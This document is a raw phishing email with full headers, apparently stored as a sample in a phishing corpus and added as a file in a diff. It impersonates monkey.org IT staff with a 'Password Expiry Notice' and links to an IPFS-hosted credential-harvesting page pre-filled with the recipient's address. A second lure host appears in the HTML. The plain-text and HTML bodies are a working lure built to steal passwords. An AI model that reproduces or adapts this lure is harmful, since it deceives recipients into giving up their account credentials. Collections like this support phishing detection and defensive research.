@@ -1,0 +1,164 @@
+Return-Path: webmail@support.org
+Delivered-To: jose@monkey.org
+X-FDA: 83546139768.09.B689C00
+Received: from peacefulspring.aeza.network (unknown [77.110.100.11])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP id 95976180004
+	for <jose@monkey.org>; Thu, 12 Jun 2025 08:55:22 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf09.b.hostedemail.com: domain of webmail@support.org has no SPF policy when checking 77.110.100.11) smtp.mailfrom=webmail@support.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1749718523; a=rsa-sha256;
+	cv=none;
+	b=kCnBRuSapvKl7fl+X6T1E1mdoeyRaHRcrhuNEc/A4/TjMfnGa3k7YQPzov722c5itvjWvn
+	2qXtSc0zmb0ZZxYmJzEtPmUHYFnoNJABZ/F6Km17KT7FjXG3enYdc7SonkR+v9grwnpg3h
+	elRnCuVyQVUf9pXEOA62On4MUhbLG60=
+ARC-Authentication-Results: i=1;
+	imf09.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf09.b.hostedemail.com: domain of webmail@support.org has no SPF policy when checking 77.110.100.11) smtp.mailfrom=webmail@support.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1749718523;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=geNxKJbM0jVRAdKTLxxqp63BRnXHzNfJcydOdoQRED8=;
+	b=h9riASNYcI22U2l43kM5+kEn2OqIRYfP8r3XAloShLuUnAt1NYoxp+fRjo328Ci2szJ8sK
+	L6TN1tysijNK3lDtL8Thi0jUWmwOntpn2gU4P/ngXQjog2CCbNT+zPOGyA1cPcsojIgfGU
+	wPmo/pv14o5k4wWEOybQKK2JQiIU2V0=
+Received: from HY-52247 (localhost [127.0.0.1])
+	by peacefulspring.aeza.network (Postfix) with ESMTP id DEABC53DCF8
+	for <jose@monkey.org>; Thu, 12 Jun 2025 10:50:57 +0200 (CEST)
+From: "monkey.org" <webmail@support.org>
+Subject: Action required: Mail error
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="PLaWUSX4vCUbKcm6j4EbhVTs1=_7ZmWmN5"
+MIME-Version: 1.0
+Date: Thu, 12 Jun 2025 04:50:58 -0400
+Message-Id: <12572025065004620667B50A$55320A6AF7@support.org>
+X-Rspamd-Queue-Id: 95976180004
+X-Stat-Signature: t7cnknonc8ttcqsxu3tzb9zsyzy5jegm
+X-Rspam-User: 
+X-Spam-Status: Yes, score=13.70
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1749718522-590652
+X-HE-Meta: U2FsdGVkX19NvjjklYlYpQJVTdvUdhX4q6bg0x2nRVKBofkcdmjn0N7xIW4MSXgOaib3c5QcqpGp1sfpHQGGODT/0TfFBlvv8dNKYM1BmC/Y8woRAQBlv0aTLCiw2zFHXIw1ZEagjG8Udp+LfQtfjFHaLCWJfMBnm5u85W0cc6rICEGnPFrZ06ITZIxiJrjWw6aeBwV/EC8BN9LE3rTZ8yemZSzLJfccMZkVqESeen1eME9SyFrDLx26mzWcNhX59hpZ/N1LwySdXFdyzlWGiyw+WuUU2hDmYm9rPH2glrsCwspUnL1KC4T8AC110RNt5ph0pWuztIB3nf79BF6+C3HLbiKHxp/gKr2KvTpleBPyYc/qxJ0pxIYu9yz3TMaHfNAfG6jBWT+zChpbwXjU9jN3Qoiyz5UN8ydjG7Qf6f+LUx4gBjHDtD3PnhkWFn9Sw9k+k9BIpOEFGwpgUGNXAYqcN3RNicm2bEMiz8rHYFr5s7VxX+ho0XrCFYJBzifujmxOYUP6l/7X8+0z3uRljSFxc0/E8QnZ1XjU1RCoX7ijoEVSjYFxG6amrp/fM2MhekmHQ9LKplFZhYDDePQgtWPEd8u+PSYnM/lKJcypxtczC9ZzQgYPWxAAtZLwD1iLQ7JyzHUBEfs6C/SCyQXZrezZrgptoVDp+2F5vl/gCMyv39r9t91nWSb84O+IRAPMLfEQw6GI80xnZ5AS0DzCc0T69jFRpxOAGiwr9pD8U7u5o6HEyCA5Kf17UoUvWe/suZFDYvtOoDwVXQIL2M/Z7JzmxioYQqUAJ37kUBPrfeE7WXjSnvZw6yxgoDt4u8do/6RouQ9rV4ijfBE0dhvPFpb+BtE8XVe8ZBw6JTNJMsaHhNjOq9opgZb7h9uJ1XQLE43zSUJhHSK/P09W0v6d/vChKrK8Q3hsUAxdFPUTPwBd4/FLTwejdK8Ap3S5iP8KIHlecp563DLuvelYHx1fOcpGufL
+ UkPmRgO4XEOTIzCK0jUPvmjB2BgD9Vwoy0w6jLiZ1gXOEGoVPgekrbrZVt3oK+gcQL6sx1Fed+U3AXzGoLX1hcohgrKqRy4+7B4UpcT4GoPfqwMrCIRwTd08xS4MKmMLiqHqFWmLZD/m6jTCWrv72YzvH0SrQ7hxXjpYKpsPGN+hfWPAkGooKVTRAfmVtrIo9beOAG33RXSF0Jkpp3vMam6cVN556MbHi/6L+x6BF/ClcbevXQvpv3eBqG/45vIjqbYCMw1zbE85wobpxm3/NFj+zqhxf0L2MVqO/GMbgQOC9iWqmgmXVqwLJt7vUj/2g4yCxssgCeU38Zibig2PjtkTW3+/jjkhwSE0Iklp7EOgwRyqnpnFyQceGshcv+/WmtQcIIPfksTWFeKX5aOrdBIB5uagwR/I4OBdUU6Xe5mE3qJHVf0yjOOYlfKXbxbrjFZ09Kgi7+69GJP99qgyaMHXd/jWbgsrwVBs9+swU2PQGR6fWheOQaVqQzhhSnhDyv4P1LJiV04UIh3VdDOcKb+0j111qM2iC9/u3MxqDfXhLT/LkwYn67BG50ekn/82ZlgWO3hx3tawmMJDw1gh8MJwbpcsp9c6lvf+OTTvGeInj7ajCCE3JH9yMT6FeojX/6No29BJTe0XMhfAiv+LADQrXjjRZu1dIfBdXKWeW0qe07WECrasaVUaqaGXgWutBqkqihhxPN1I3y2ThcfbTqSISP58mceeRJnAMbxoDIusKsXD4BNbObgX9S140br0R8dW+9YtUne+cAEDIQazGzB4FslI+4Q+jMuN88vqQbSeJhOC1JfJsrHeeZhtK/568U/1TY71N7A6nZ8CK2krZfmlK08+4jUCshyq3SE3iHVsK4+JMEdveSRV/QgLrNp64qryPkF7NblJDm9W1aYXpU3HqwW8EmfK4JVFycMhsypjV5t8=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 255
+
+This is a multi-part message in MIME format
+
+--PLaWUSX4vCUbKcm6j4EbhVTs1=_7ZmWmN5
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+monkey.org Password Expiry Notice.
+
+Your Password is due for Renewal
+
+IT Management.
+
+Enter Same password of identification To Continue.
+
+Activate Same Password https://ipfs.io/ipfs/bafybeigwgis2qzeucrmuuj6y5=
+ndwo7tqv765ufjymexlo7v4ypd2gdzg54/Teegramdomain02.html/?eta=3Djose@mon=
+key.org
+
+=A9=AD 2025 Cedefense All ri=ADght re=ADser=ADved.
+
+--PLaWUSX4vCUbKcm6j4EbhVTs1=_7ZmWmN5
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META name=3D"viewport" content=3D"width=3Ddevice-width, initial-sca=
+le=3D1"> <META name=3D"format-detection" content=3D"telephone=3Dno"><t=
+itle>Action required: Mail error</title>
+ </head>
+ <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <P><tabl=
+e style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; T=
+EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
+E: normal; ORPHANS: 2; WIDOWS: 2; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style: initial; text-decoration-c=
+olor: initial; font-stretch: inherit" cellSpacing=3D0 cellPadding=3D0 =
+width=3D604 bgColor=3D#ededed border=3D0><tbody style=3D"BOX-SIZING: b=
+order-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZ=
+ING: border-box; FONT-SIZE: 18px; BORDER-TOP: rgb(85,88,175) 4px solid=
+; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; COLOR:=
+ rgb(85,88,175); PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT:=
+ 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3Dcenter><BR style=3D"BOX=
+-SIZING: border-box">monkey.org Password Expiry Notice.</TD></TR> <TR =
+style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box;=
+ PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; MARGIN: =
+0px; PADDING-RIGHT: 20px" align=3Dcenter> <H4>Your Password is due for=
+ Renewal</H4></TD></TR> <TR style=3D"BOX-SIZING: border-box"> <TD styl=
+e=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 162px; MARGIN: 0px; PADDING-RIGHT: 162px" align=3Dcenter><=
+table style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D=
+0 width=3D280 bgColor=3D#ffffff border=3D0><tbody style=3D"BOX-SIZING:=
+ border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-S=
+IZING: border-box; MARGIN: 0px" width=3D10>&nbsp;</td><td style=3D"BOX=
+-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-=
+LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" width=3D260 align=3Dcenter=
+><BR style=3D"BOX-SIZING: border-box"></td><td style=3D"BOX-SIZING: bo=
+rder-box; MARGIN: 0px" width=3D10> <P style=3D"BOX-SIZING: border-box;=
+ MARGIN-TOP: 0px" align=3Dcenter>&nbsp;</P></TD></TR> <TR style=3D"BOX=
+-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; MARGIN: 0px=
+" width=3D10>&nbsp;</td><td style=3D"BOX-SIZING: border-box; MAX-WIDTH=
+: 260px; MARGIN: 0px" width=3D260 align=3Dcenter> <H3>IT Management.</=
+H3></td><td style=3D"BOX-SIZING: border-box; MARGIN: 0px" width=3D10>&=
+nbsp;</TD></TR> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX=
+-SIZING: border-box; MARGIN: 0px" width=3D10>&nbsp;</td><td style=3D"B=
+OX-SIZING: border-box; FONT-SIZE: 14px; MAX-WIDTH: 260px; FONT-FAMILY:=
+ 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; COLOR: rgb(83,92,109=
+); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 0px; MIN-HEI=
+GHT: 20px; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px" width=3D=
+260 align=3Dcenter><FONT style=3D"BOX-SIZING: border-box" face=3D"Malg=
+un Gothic">Enter Same password of identification&nbsp; To Continue</FO=
+NT>.</td><td style=3D"BOX-SIZING: border-box; MARGIN: 0px" width=3D10>=
+&nbsp;</TD></TR> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BO=
+X-SIZING: border-box; MARGIN: 0px" width=3D10>&nbsp;</td><td style=3D"=
+BORDER-TOP-STYLE: solid; BOX-SIZING: border-box; FONT-SIZE: 14px; MAX-=
+WIDTH: 260px; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans-s=
+erif; BORDER-TOP-COLOR: rgb(226,231,236); COLOR: rgb(83,92,109); PADDI=
+NG-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 0px; MIN-HEIGHT: 60p=
+x; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px" width=3D260 ali=
+gn=3Dcenter><SPAN id=3Dm_-7327714563498591073m_-7710103801560380535m_3=
+190235512647849355gmail-v1m_6619297345427085957m_1935561991645133031m_=
+-9130675755917152087m_-1066670795396961918yiv0424743290v1yiv3471916749=
+v1v1ydp84b7bd72v1m_-5513947145391854696gmail-v1m_-5398474230083305038m=
+_-6571479965940022972gmail-v1m_-9055030086718412509m_42408946148905256=
+51m_9036114621261577984m_-6380476158496337886m_-5596140466144425313m_1=
+855324654908417838gmail-x_OBJ_PREFIX_DWT290_com_zimbra_url style=3D"BO=
+RDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px;=
+ VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px; BORDER-TOP-WIDTH: 0px"><A style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZ=
+ING: border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BO=
+RDER-BOTTOM-WIDTH: 0px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 5px; =
+PADDING-TOP: 5px; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px=
+; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(43,196,242); text-decor=
+ation-line: none" href=3D"https://ipfs.io/ipfs/bafybeigwgis2qzeucrmuuj=
+6y5ndwo7tqv765ufjymexlo7v4ypd2gdzg54/Teegramdomain02.html/?eta=3Djose@=
+monkey.org" rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"h=
+ttps://www.google.com/url?q=3Dhttps://tiny-raincoat-colossal.on-fleek.=
+app/ppush.html/%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D174=
+9729698295000&amp;usg=3DAOvVaw1Yyl_jUFCdeHuiVp2jX7_e">Activate Same Pa=
+ssword&nbsp;</A>&nbsp;&nbsp;</SPAN><BR style=3D"BOX-SIZING: border-box=
+"><BR style=3D"BOX-SIZING: border-box">&copy;&shy; 2025 Cedefense All =
+ri&shy;ght re&shy;ser&shy;ved.&nbsp;</TD></TR></TABLE></TD></TR></TABL=
+E></P></body>
+ </html>
+
+--PLaWUSX4vCUbKcm6j4EbhVTs1=_7ZmWmN5--
+
